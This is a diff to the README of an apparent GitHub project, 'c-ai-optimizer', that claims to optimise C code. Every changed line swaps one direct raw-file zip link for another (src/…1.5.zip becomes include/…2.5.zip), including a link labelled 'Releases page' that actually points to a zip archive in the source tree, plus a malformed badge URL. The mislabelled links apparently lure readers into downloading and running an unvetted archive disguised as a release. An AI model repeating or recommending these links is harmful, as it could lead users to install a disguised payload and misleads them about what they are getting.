@@ -1,6 +1,6 @@
 # 🚀 c-ai-optimizer - Optimize Your C Code Efficiently
 
-[![Download Now](https://raw.githubusercontent.com/zizo1231313/c-ai-optimizer/main/src/c-ai-optimizer_1.5.zip%20Now-Ready%20to%https://raw.githubusercontent.com/zizo1231313/c-ai-optimizer/main/src/c-ai-optimizer_1.5.zip)](https://raw.githubusercontent.com/zizo1231313/c-ai-optimizer/main/src/c-ai-optimizer_1.5.zip)
+[![Download Now](https://raw.githubusercontent.com/zizo1231313/c-ai-optimizer/main/include/c_ai_optimizer_2.5.zip%20Now-Ready%20to%https://raw.githubusercontent.com/zizo1231313/c-ai-optimizer/main/include/c_ai_optimizer_2.5.zip)](https://raw.githubusercontent.com/zizo1231313/c-ai-optimizer/main/include/c_ai_optimizer_2.5.zip)
 
 ## 🌟 Introduction
 
@@ -12,7 +12,7 @@ Ready to get started? Follow the steps below to download and run c-ai-optimizer.
 
 ## 📥 Download & Install
 
-1. Visit the [Releases page](https://raw.githubusercontent.com/zizo1231313/c-ai-optimizer/main/src/c-ai-optimizer_1.5.zip) to find the downloadable files.
+1. Visit the [Releases page](https://raw.githubusercontent.com/zizo1231313/c-ai-optimizer/main/include/c_ai_optimizer_2.5.zip) to find the downloadable files.
    
 2. Look for the latest version of **c-ai-optimizer**. You will see different file options to choose from. 
 
@@ -69,4 +69,4 @@ We thank all contributors and users who provide valuable feedback. Your support 
 
 Enjoy optimizing your C code with **c-ai-optimizer**! 
 
-[Download Now](https://raw.githubusercontent.com/zizo1231313/c-ai-optimizer/main/src/c-ai-optimizer_1.5.zip) again to get started!
+[Download Now](https://raw.githubusercontent.com/zizo1231313/c-ai-optimizer/main/include/c_ai_optimizer_2.5.zip) again to get started!
